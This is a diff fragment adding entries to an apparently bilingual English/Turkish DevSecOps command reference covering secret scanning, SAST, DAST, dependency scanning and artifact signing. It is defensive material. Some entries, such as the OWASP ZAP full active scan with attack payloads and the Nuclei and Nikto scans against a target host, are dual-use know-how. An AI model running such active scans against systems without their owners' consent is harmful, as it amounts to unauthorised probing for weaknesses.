+            "cmd": "trufflehog git file://<PATH> --since-commit=<BASE_SHA> --branch=<BRANCH> --only-verified",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "TruffleHog: scan via Docker image",
+            "desc": "Run trufflehog without local install",
+            "desc_tr": "Yerel kurulum olmadan trufflehog calistir",
+            "cmd": "docker run --rm -v <PATH>:/pwd trufflesecurity/trufflehog:latest git file:///pwd --only-verified",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "detect-secrets: create a baseline",
+            "desc": "Generate a baseline file of current detected secrets",
+            "desc_tr": "Mevcut tespit edilen secretlerin baseline dosyasini olustur",
+            "cmd": "detect-secrets scan > .secrets.baseline",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "The baseline records known findings so only NEW secrets fail future runs."
+          },
+          {
+            "title": "detect-secrets: scan all files including untracked",
+            "desc": "Scan the whole tree, not just git-tracked files",
+            "desc_tr": "Yalnizca git-takipli dosyalari degil tum agaci tara",
+            "cmd": "detect-secrets scan --all-files > .secrets.baseline",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "detect-secrets: audit baseline interactively",
+            "desc": "Review and label each finding as true/false positive",
+            "desc_tr": "Her bulguyu dogru/yanlis pozitif olarak gozden gecir ve etiketle",
+            "cmd": "detect-secrets audit .secrets.baseline",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "detect-secrets: scan staged diff in pre-commit",
+            "desc": "Block new secrets against an existing baseline",
+            "desc_tr": "Mevcut baseline'a karsi yeni secretleri engelle",
+            "cmd": "git diff --staged --name-only -z | xargs -0 detect-secrets-hook --baseline .secrets.baseline",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "The official pre-commit hook 'detect-secrets-hook' exits non-zero when a secret outside the baseline appears."
+          },
+          {
+            "title": "detect-secrets: enable high-entropy plugins",
+            "desc": "Tune entropy detectors to catch random-looking strings",
+            "desc_tr": "Rastgele gorunumlu dizeleri yakalamak icin entropi dedektorlerini ayarla",
+            "cmd": "detect-secrets scan --base64-limit 4.5 --hex-limit 3 > .secrets.baseline",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "detect-secrets: scan with a custom plugin/regex",
+            "desc": "Add a project-specific regex detector",
+            "desc_tr": "Projeye ozel bir regex dedektoru ekle",
+            "cmd": "detect-secrets scan --custom-plugins <PLUGIN.py> > .secrets.baseline",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Wire scanners into pre-commit framework",
+            "desc": "Install pre-commit framework hooks and run them on all files",
+            "desc_tr": "Pre-commit framework kancalarini kur ve tum dosyalarda calistir",
+            "cmd": "pre-commit install && pre-commit run --all-files",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Add gitleaks and detect-secrets repos to .pre-commit-config.yaml so every commit is gated automatically."
+          },
+          {
+            "title": "Purge a leaked secret from git history",
+            "desc": "Rewrite history to remove an already-committed secret",
+            "desc_tr": "Halihazirda commit edilmis bir secret'i kaldirmak icin gecmisi yeniden yaz",
+            "cmd": "git filter-repo --replace-text <REPLACEMENTS.txt> && git push --force --all",
+            "tags": [
+              "advanced"
+            ],
+            "note": "ROTATE the secret first; rewriting history does NOT invalidate an already-leaked credential. Coordinate the force-push with your team."
+          },
+          {
+            "title": "GitHub Action: gitleaks in CI",
+            "desc": "Run the official gitleaks action on push/PR",
+            "desc_tr": "Push/PR'da resmi gitleaks action'ini calistir",
+            "cmd": "uses: gitleaks/gitleaks-action@v2",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Set fetch-depth: 0 in actions/checkout so the full history is available, and pass GITLEAKS_LICENSE for org repos."
+          },
+          {
+            "title": "TruffleHog: include unverified candidates",
+            "desc": "Surface unverifiable secrets while filtering noise",
+            "desc_tr": "Gurultu filtrelenirken dogrulanamayan secretleri de goster",
+            "cmd": "trufflehog git file://<PATH> --results=verified,unknown --json",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Use 'verified,unknown' to drop noisy false positives while still catching secrets whose providers can't be verified."
+          }
+        ]
+      },
+      {
+        "name": "SAST in Pipeline (Semgrep, CodeQL, Bandit)",
+        "commands": [
+          {
+            "title": "Install Semgrep via pip",
+            "desc": "Install Semgrep CLI in a CI runner",
+            "desc_tr": "CI runner icinde Semgrep CLI'yi kurar",
+            "cmd": "python3 -m pip install --upgrade semgrep",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep scan with default rules (CI mode)",
+            "desc": "Run Semgrep in CI mode with auto config",
+            "desc_tr": "Semgrep'i CI modunda otomatik kural seti ile calistirir",
+            "cmd": "semgrep ci --config auto",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "semgrep ci auto-detects baseline/diff against the default branch when run in a CI provider."
+          },
+          {
+            "title": "Semgrep scan with curated security ruleset",
+            "desc": "Scan a path using the p/security-audit ruleset",
+            "desc_tr": "Bir dizini p/security-audit kural seti ile tarar",
+            "cmd": "semgrep scan --config p/security-audit <PATH>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep multiple registry rulesets",
+            "desc": "Combine OWASP, secrets and CI rulesets in one run",
+            "desc_tr": "OWASP, secrets ve CI kural setlerini tek calismada birlestirir",
+            "cmd": "semgrep scan --config p/owasp-top-ten --config p/secrets --config p/ci <PATH>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep output SARIF for code scanning upload",
+            "desc": "Produce SARIF report for GitHub/GitLab ingestion",
+            "desc_tr": "GitHub/GitLab'a aktarim icin SARIF raporu uretir",
+            "cmd": "semgrep scan --config auto --sarif --output semgrep.sarif <PATH>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep JSON output for tooling",
+            "desc": "Emit machine-readable JSON results",
+            "desc_tr": "Makine tarafindan okunabilir JSON sonucu uretir",
+            "cmd": "semgrep scan --config auto --json --output semgrep.json <PATH>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep fail pipeline on findings severity",
+            "desc": "Gate the build by only failing on ERROR severity",
+            "desc_tr": "Build'i yalnizca ERROR seviyesindeki bulgularda basarisiz yapar",
+            "cmd": "semgrep scan --config auto --severity ERROR --error <PATH>",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "--error sets a non-zero exit code when matching findings exist; combine with --severity to control the gate."
+          },
+          {
+            "title": "Semgrep diff-aware scan (only changed code)",
+            "desc": "Scan only changes since a baseline commit",
+            "desc_tr": "Yalnizca bir baseline commit'ten beri degisen kodu tarar",
+            "cmd": "semgrep scan --config auto --baseline-commit <COMMIT_SHA> <PATH>",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Diff-aware scanning drastically cuts PR scan time by reporting only newly introduced findings."
+          },
+          {
+            "title": "Semgrep custom rule file",
+            "desc": "Run an organization-specific YAML rule",
+            "desc_tr": "Kuruma ozel YAML kuralini calistirir",
+            "cmd": "semgrep scan --config <FILE>.yaml <PATH>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep validate custom rules",
+            "desc": "Lint and validate rule files before committing",
+            "desc_tr": "Kural dosyalarini commit etmeden once dogrular ve denetler",
+            "cmd": "semgrep --validate --config <FILE>.yaml",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep with autofix applied",
+            "desc": "Automatically apply rule-provided fixes",
+            "desc_tr": "Kuralin sundugu duzeltmeleri otomatik uygular",
+            "cmd": "semgrep scan --config auto --autofix <PATH>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Semgrep in Docker (no local install)",
+            "desc": "Run Semgrep via the official container image",
+            "desc_tr": "Semgrep'i resmi konteyner imaji ile calistirir",
+            "cmd": "docker run --rm -v \"${PWD}:/src\" semgrep/semgrep semgrep scan --config auto /src",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Install Bandit for Python SAST",
+            "desc": "Install Bandit with TOML config support",
+            "desc_tr": "Bandit'i TOML config destegi ile kurar",
+            "cmd": "python3 -m pip install 'bandit[toml]'",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Bandit recursive scan of a project",
+            "desc": "Recursively scan Python source for issues",
+            "desc_tr": "Python kaynak kodunu ozyinelemeli olarak tarar",
+            "cmd": "bandit -r <PATH>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Bandit gate on severity and confidence",
+            "desc": "Fail only on medium+ severity and confidence",
+            "desc_tr": "Yalnizca orta ve uzeri ciddiyet/guvende basarisiz olur",
+            "cmd": "bandit -r <PATH> -ll -ii",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "-l/-ll/-lll raises the severity gate; -i/-ii/-iii raises the confidence gate. Repeat the letter to increase the threshold."
+          },
+          {
+            "title": "Bandit SARIF report for code scanning",
+            "desc": "Output SARIF using the bandit-sarif formatter",
+            "desc_tr": "bandit-sarif formatlayicisi ile SARIF ciktisi verir",
+            "cmd": "bandit -r <PATH> --format sarif --output bandit.sarif",
+            "tags": [
+              "tool"
+            ],
+            "note": "Requires the bandit_sarif_formatter package (pip install bandit-sarif-formatter)."
+          },
+          {
+            "title": "Bandit JSON output to file",
+            "desc": "Emit JSON results for pipeline parsing",
+            "desc_tr": "Pipeline ayristirmasi icin JSON sonucu uretir",
+            "cmd": "bandit -r <PATH> -f json -o bandit.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Bandit with config file and baseline",
+            "desc": "Use a config file and ignore known baseline findings",
+            "desc_tr": "Config dosyasi kullanir ve bilinen baseline bulgularini gozardi eder",
+            "cmd": "bandit -r <PATH> -c pyproject.toml -b baseline.json",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Generate the baseline first with: bandit -r <PATH> -f json -o baseline.json"
+          },
+          {
+            "title": "Bandit skip specific test IDs",
+            "desc": "Exclude noisy checks like assert_used (B101)",
+            "desc_tr": "assert_used (B101) gibi gurultulu kontrolleri haric tutar",
+            "cmd": "bandit -r <PATH> --skip B101,B601",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Install CodeQL CLI bundle",
+            "desc": "Download and unpack the CodeQL CLI + query bundle",
+            "desc_tr": "CodeQL CLI ve sorgu paketini indirip acar",
+            "cmd": "gh extension install github/gh-codeql && gh codeql set-version latest",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "CodeQL create database (compiled language)",
+            "desc": "Build a CodeQL DB for a compiled project",
+            "desc_tr": "Derlenen bir proje icin CodeQL veritabani olusturur",
+            "cmd": "codeql database create <PATH>/codeql-db --language=<LANGUAGE> --command=\"<BUILD_COMMAND>\"",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Interpreted languages (python, javascript, ruby) do not need --command; compiled ones (java, cpp, csharp, go) do."
+          },
+          {
+            "title": "CodeQL create database (no build, interpreted)",
+            "desc": "Create DB for JS/Python without a build step",
+            "desc_tr": "Build adimi olmadan JS/Python icin veritabani olusturur",
+            "cmd": "codeql database create <PATH>/codeql-db --language=javascript --source-root <PATH>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "CodeQL analyze with security suite to SARIF",
+            "desc": "Run the security-extended suite and emit SARIF",
+            "desc_tr": "security-extended sorgu setini calistirip SARIF uretir",
+            "cmd": "codeql database analyze <PATH>/codeql-db --format=sarif-latest --output=codeql.sarif <LANGUAGE>-security-extended.qls",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "CodeQL analyze with quality + security and threads",
+            "desc": "Run security-and-quality suite using all CPU cores",
+            "desc_tr": "security-and-quality setini tum CPU cekirdekleriyle calistirir",
+            "cmd": "codeql database analyze <PATH>/codeql-db --format=sarif-latest --output=codeql.sarif --threads=0 <LANGUAGE>-security-and-quality.qls",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "--threads=0 uses one thread per available core; speeds up large database analysis."
+          },
+          {
+            "title": "CodeQL upload SARIF results to GitHub",
+            "desc": "Push SARIF to GitHub code scanning API",
+            "desc_tr": "SARIF'i GitHub code scanning API'sine yukler",
+            "cmd": "codeql github upload-results --sarif=codeql.sarif --repository=<OWNER>/<REPO> --ref=refs/heads/main --commit=<COMMIT_SHA>",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Requires GITHUB_TOKEN env var with security-events: write permission."
+          },
+          {
+            "title": "Upload any SARIF via GitHub CLI / API",
+            "desc": "Upload a SARIF file produced by any SAST tool",
+            "desc_tr": "Herhangi bir SAST aracinin urettigi SARIF dosyasini yukler",
+            "cmd": "gzip -c semgrep.sarif | base64 -w0 | gh api repos/<OWNER>/<REPO>/code-scanning/sarifs -f commit_sha=<COMMIT_SHA> -f ref=refs/heads/main -f sarif=@-",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "GitHub's code-scanning SARIF endpoint expects gzipped + base64-encoded SARIF content."
+          },
+          {
+            "title": "Run multiple SAST tools and merge SARIF",
+            "desc": "Scan with Semgrep + Bandit then combine reports",
+            "desc_tr": "Semgrep + Bandit ile tarayip raporlari birlestirir",
+            "cmds": [
+              "semgrep scan --config auto --sarif --output semgrep.sarif <PATH>",
+              "bandit -r <PATH> --format sarif --output bandit.sarif",
+              "jq -s '{ version: .[0].version, runs: (map(.runs) | add) }' semgrep.sarif bandit.sarif > combined.sarif"
+            ],
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "GitHub also accepts multiple SARIF uploads per commit without manual merging; merge only when a single artifact is required."
+          }
+        ]
+      },
+      {
+        "name": "DAST & Dependency Scanning in Pipeline",
+        "commands": [
+          {
+            "title": "OWASP ZAP Baseline Scan",
+            "desc": "Run passive DAST baseline scan against a running app in CI",
+            "desc_tr": "Çalışan uygulamaya karşı pasif DAST baseline taraması (CI içinde) çalıştır",
+            "cmd": "docker run --rm -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://<TARGET_IP> -r zap-report.html",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "Baseline tarama spider çalıştırır ama aktif saldırı yapmaz; CI'da hızlı ve düşük riskli olduğu için pipeline gate olarak idealdir."
+          },
+          {
+            "title": "OWASP ZAP Full Active Scan",
+            "desc": "Run full active DAST scan with attack payloads",
+            "desc_tr": "Saldırı yükleriyle tam aktif DAST taraması çalıştır",
+            "cmd": "docker run --rm -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py -t https://<TARGET_IP> -m 5 -r zap-full-report.html",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Aktif tarama gerçek payload gönderir; sadece izole staging ortamlarında çalıştırın, prod'a karşı kullanmayın."
+          },
+          {
+            "title": "OWASP ZAP API Scan (OpenAPI)",
+            "desc": "DAST scan of a REST API using its OpenAPI definition",
+            "desc_tr": "OpenAPI tanımını kullanarak REST API için DAST taraması yap",
+            "cmd": "docker run --rm -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py -t https://<DOMAIN>/openapi.json -f openapi -r zap-api-report.html",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "ZAP Fail on High Risk Alerts",
+            "desc": "Make the pipeline fail when ZAP finds high-risk issues",
+            "desc_tr": "ZAP yüksek riskli sorun bulduğunda pipeline'ı başarısız yap",
+            "cmd": "docker run --rm -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://<TARGET_IP> -c zap.conf -I; test $? -lt 2",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "ZAP exit kodları: 0=temiz, 1=warn, 2=fail, 3=hata. '-I' uyarıları başarısızlık saymaz; gate mantığını exit koduyla kurun."
+          },
+          {
+            "title": "Nuclei DAST Template Scan",
+            "desc": "Run Nuclei templated vulnerability scan against a target URL",
+            "desc_tr": "Hedef URL'ye karşı Nuclei şablonlu zafiyet taraması çalıştır",
+            "cmd": "nuclei -u https://<DOMAIN> -severity critical,high -stats -j -o nuclei-results.json",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Nuclei CI Mode with Exit Code",
+            "desc": "Run Nuclei in CI and fail when matches are found",
+            "desc_tr": "Nuclei'yi CI modunda çalıştır ve eşleşme bulununca başarısız ol",
+            "cmd": "nuclei -l targets.txt -severity high,critical -ni -ec -duc -o nuclei-ci.txt",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "'-ni' interactsh'ı kapatır (CI ağ kısıtları için), '-duc' güncelleme kontrolünü devre dışı bırakır, '-ec' boş sonuç dosyalarını eler."
+          },
+          {
+            "title": "Nikto Web Server Scan",
+            "desc": "Scan a web server for known dangerous files and misconfigs",
+            "desc_tr": "Web sunucusunu bilinen tehlikeli dosyalar ve hatalı yapılandırmalar için tara",
+            "cmd": "nikto -h https://<TARGET_IP> -Format json -output nikto-report.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Filesystem Dependency Scan",
+            "desc": "Scan project dependencies on disk for known CVEs",
+            "desc_tr": "Diskteki proje bağımlılıklarını bilinen CVE'ler için tara",
+            "cmd": "trivy fs --scanners vuln <PATH> --severity HIGH,CRITICAL --format table",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Fail Pipeline on Vulns",
+            "desc": "Return non-zero exit code when vulnerabilities are found",
+            "desc_tr": "Zafiyet bulunduğunda sıfır olmayan çıkış kodu döndür",
+            "cmd": "trivy fs --scanners vuln <PATH> --severity CRITICAL --exit-code 1 --ignore-unfixed",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "note": "'--ignore-unfixed' henüz yaması olmayan CVE'leri geçer; pipeline'ı sadece çözülebilir sorunlarda kırmak için kullanışlıdır."
+          },
+          {
+            "title": "Trivy Image Vulnerability Scan",
+            "desc": "Scan a built container image for OS and library CVEs",
+            "desc_tr": "Derlenmiş konteyner imajını OS ve kütüphane CVE'leri için tara",
+            "cmd": "trivy image --severity HIGH,CRITICAL --exit-code 1 <REGISTRY>/<IMAGE>:latest",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy SBOM Generation (CycloneDX)",
+            "desc": "Generate a CycloneDX SBOM from project dependencies",
+            "desc_tr": "Proje bağımlılıklarından CycloneDX formatında SBOM üret",
+            "cmd": "trivy fs --format cyclonedx --output sbom.cdx.json <PATH>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Grype Dependency Scan",
+            "desc": "Scan a directory or image for vulnerabilities with Grype",
+            "desc_tr": "Grype ile bir dizini veya imajı zafiyetler için tara",
+            "cmd": "grype dir:<PATH> --fail-on high -o table",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Grype Scan SBOM",
+            "desc": "Match an existing SBOM against vulnerability databases",
+            "desc_tr": "Mevcut bir SBOM'u zafiyet veritabanlarıyla eşleştir",
+            "cmd": "grype sbom:./sbom.cdx.json --fail-on critical -o json",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Syft Generate SBOM",
+            "desc": "Produce an SBOM from an image to feed dependency scanners",
+            "desc_tr": "Bağımlılık tarayıcılarını beslemek için imajdan SBOM üret",
+            "cmd": "syft <REGISTRY>/<IMAGE>:latest -o cyclonedx-json=sbom.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "OWASP Dependency-Check Scan",
+            "desc": "Run OWASP Dependency-Check SCA and fail on CVSS threshold",
+            "desc_tr": "OWASP Dependency-Check SCA çalıştır ve CVSS eşiğinde başarısız ol",
+            "cmd": "docker run --rm -v $(pwd):/src owasp/dependency-check --scan /src --format HTML --failOnCVSS 7 --out /src/dc-report",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "İlk çalıştırmada NVD veri tabanını indirir; CI'da hız için '--data' ile cache dizinini kalıcı volume'a bağlayın ve NVD API anahtarı kullanın."
+          },
+          {
+            "title": "npm audit in Pipeline",
+            "desc": "Audit Node.js dependencies and fail on high severity",
+            "desc_tr": "Node.js bağımlılıklarını denetle ve yüksek önem derecesinde başarısız ol",
+            "cmd": "npm audit --audit-level=high --omit=dev",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "yarn audit JSON Output",
+            "desc": "Audit Yarn dependencies and emit machine-readable JSON",
+            "desc_tr": "Yarn bağımlılıklarını denetle ve makine okunabilir JSON üret",
+            "cmd": "yarn audit --level high --json > yarn-audit.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "pip-audit Python Scan",
+            "desc": "Scan installed Python packages for known vulnerabilities",
+            "desc_tr": "Kurulu Python paketlerini bilinen zafiyetler için tara",
+            "cmd": "pip-audit -r requirements.txt --strict --desc",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "OSV-Scanner Lockfile Scan",
+            "desc": "Scan lockfiles against the OSV vulnerability database",
+            "desc_tr": "Kilit dosyalarını OSV zafiyet veritabanına karşı tara",
+            "cmd": "osv-scanner scan source --recursive <PATH>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "OSV-Scanner with SARIF Output",
+            "desc": "Scan and output SARIF for CI security tab integration",
+            "desc_tr": "Tara ve CI güvenlik sekmesi entegrasyonu için SARIF üret",
+            "cmd": "osv-scanner scan source -r --format sarif --output osv.sarif <PATH>",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "SARIF çıktısı GitHub Code Scanning / Azure DevOps güvenlik sekmesine yüklenerek bulgular PR üzerinde gösterilebilir."
+          },
+          {
+            "title": "govulncheck Go Modules",
+            "desc": "Scan Go code for vulnerabilities actually reachable in calls",
+            "desc_tr": "Go kodunu çağrılarda gerçekten erişilebilir zafiyetler için tara",
+            "cmd": "govulncheck ./...",
+            "tags": [
+              "tool"
+            ],
+            "note": "Sadece kod yolundan ulaşılabilen zafiyetleri raporlar, böylece kullanılmayan bağımlılıklardaki CVE gürültüsünü azaltır."
+          },
+          {
+            "title": "Snyk Open Source Test",
+            "desc": "Test project dependencies against the Snyk vulnerability DB",
+            "desc_tr": "Proje bağımlılıklarını Snyk zafiyet veritabanına karşı test et",
+            "cmd": "snyk test --severity-threshold=high --all-projects",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Snyk Monitor for Continuous Scanning",
+            "desc": "Snapshot dependencies to Snyk for ongoing CVE alerts",
+            "desc_tr": "Sürekli CVE uyarıları için bağımlılıkları Snyk'e gönder",
+            "cmd": "snyk monitor --all-projects --project-name=<DOMAIN>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Retire.js JavaScript Scan",
+            "desc": "Detect JavaScript libraries with known vulnerabilities",
+            "desc_tr": "Bilinen zafiyetlere sahip JavaScript kütüphanelerini tespit et",
+            "cmd": "retire --path <PATH> --outputformat json --outputpath retire-report.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Dependency-Track SBOM Upload",
+            "desc": "Push an SBOM to Dependency-Track for continuous SCA",
+            "desc_tr": "Sürekli SCA için bir SBOM'u Dependency-Track'e gönder",
+            "cmds": [
+              "curl -s -X POST https://<DOMAIN>/api/v1/bom -H \"X-Api-Key: <API_KEY>\" -H \"Content-Type: multipart/form-data\" -F \"project=<PROJECT_UUID>\" -F \"bom=@sbom.cdx.json\"",
+              "# Poll /api/v1/metrics to gate the build on policy violations"
+            ],
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Dependency-Track politika ihlallerini merkezi olarak değerlendirir; pipeline'ı /api/v1/metrics sonuçlarına göre kırabilirsiniz."
+          },
+          {
+            "title": "Semgrep Supply Chain Scan",
+            "desc": "Run reachability-aware dependency scanning with Semgrep",
+            "desc_tr": "Semgrep ile erişilebilirlik farkındalıklı bağımlılık taraması çalıştır",
+            "cmd": "semgrep ci --supply-chain --error",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Upload Trivy SARIF to GitHub",
+            "desc": "Produce SARIF from Trivy for the GitHub security tab",
+            "desc_tr": "GitHub güvenlik sekmesi için Trivy'den SARIF üret",
+            "cmd": "trivy fs --format sarif --output trivy.sarif --severity HIGH,CRITICAL <PATH>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "Artifact & Build Integrity",
+        "commands": [
+          {
+            "title": "Cosign Generate Key Pair",
+            "desc": "Generate a Cosign key pair for signing artifacts",
+            "desc_tr": "Artifactleri imzalamak için Cosign anahtar çifti oluştur",
+            "cmd": "cosign generate-key-pair",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Cosign Sign Container Image",
+            "desc": "Sign a container image with a private key",
+            "desc_tr": "Bir konteyner imajını özel anahtarla imzala",
+            "cmd": "cosign sign --key cosign.key <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Cosign Keyless Sign (OIDC)",
+            "desc": "Keyless sign using Fulcio/Rekor and OIDC identity",
+            "desc_tr": "Fulcio/Rekor ve OIDC kimliği ile anahtarsız imzalama",
+            "cmd": "COSIGN_EXPERIMENTAL=1 cosign sign --yes <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Keyless signing records the certificate in the public Rekor transparency log; the ephemeral key is tied to your OIDC identity."
+          },
+          {
+            "title": "Cosign Verify Image Signature",
+            "desc": "Verify an image signature against a public key",
+            "desc_tr": "Bir imaj imzasını açık anahtara karşı doğrula",
+            "cmd": "cosign verify --key cosign.pub <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Cosign Keyless Verify with Identity",
+            "desc": "Verify keyless signature pinning issuer and identity",
+            "desc_tr": "Yayıncı ve kimliği sabitleyerek anahtarsız imzayı doğrula",
+            "cmd": "cosign verify --certificate-identity-regexp '<IDENTITY_REGEX>' --certificate-oidc-issuer '<OIDC_ISSUER>' <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Always pin both --certificate-identity and --certificate-oidc-issuer; omitting them lets any valid Fulcio cert pass verification."
+          },
+          {
+            "title": "Cosign Attach SBOM Attestation",
+            "desc": "Sign and attach an SBOM as a signed attestation",
+            "desc_tr": "Bir SBOM'u imzalı bir attestation olarak ekle",
+            "cmd": "cosign attest --key cosign.key --type cyclonedx --predicate sbom.cdx.json <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Cosign Verify Attestation",
+            "desc": "Verify a signed attestation of a given predicate type",
+            "desc_tr": "Belirli bir predicate türünün imzalı attestation'ını doğrula",
+            "cmd": "cosign verify-attestation --key cosign.pub --type cyclonedx <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Generate SBOM with Syft (SPDX)",
+            "desc": "Produce an SPDX JSON SBOM from a container image",
+            "desc_tr": "Bir konteyner imajından SPDX JSON SBOM üret",
+            "cmd": "syft <REGISTRY>/<IMAGE>:<TAG> -o spdx-json=sbom.spdx.json",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Generate SBOM with Syft (CycloneDX)",
+            "desc": "Produce a CycloneDX JSON SBOM from a directory",
+            "desc_tr": "Bir dizinden CycloneDX JSON SBOM üret",
+            "cmd": "syft dir:<PATH> -o cyclonedx-json=sbom.cdx.json",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Scan SBOM for Vulnerabilities with Grype",
+            "desc": "Scan an existing SBOM file for known CVEs",
+            "desc_tr": "Mevcut bir SBOM dosyasını bilinen CVE'ler için tara",
+            "cmd": "grype sbom:sbom.spdx.json --fail-on high",
+            "tags": [
+              "tool",
+              "essential"
+            ],
+            "note": "Scanning the SBOM instead of the image lets you re-check for new CVEs without rebuilding."
+          },
+          {
+            "title": "Trivy Image Scan with Exit Code",
+            "desc": "Fail the build on HIGH/CRITICAL image vulnerabilities",
+            "desc_tr": "HIGH/CRITICAL imaj zafiyetlerinde build'i başarısız yap",
+            "cmd": "trivy image --severity HIGH,CRITICAL --exit-code 1 <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Trivy Generate CycloneDX SBOM",
+            "desc": "Generate a CycloneDX SBOM for an image with Trivy",
+            "desc_tr": "Trivy ile bir imaj için CycloneDX SBOM üret",
+            "cmd": "trivy image --format cyclonedx --output sbom.cdx.json <REGISTRY>/<IMAGE>:<TAG>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "SLSA Provenance Verification (slsa-verifier)",
+            "desc": "Verify SLSA provenance of an artifact and source repo",
+            "desc_tr": "Bir artifact'in SLSA kaynak deposunu ve kanıtını doğrula",
+            "cmd": "slsa-verifier verify-artifact <FILE> --provenance-path provenance.intoto.jsonl --source-uri github.com/<ORG>/<REPO>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "in-toto Run Step (Record)",
+            "desc": "Record a build step's materials and products with in-toto",
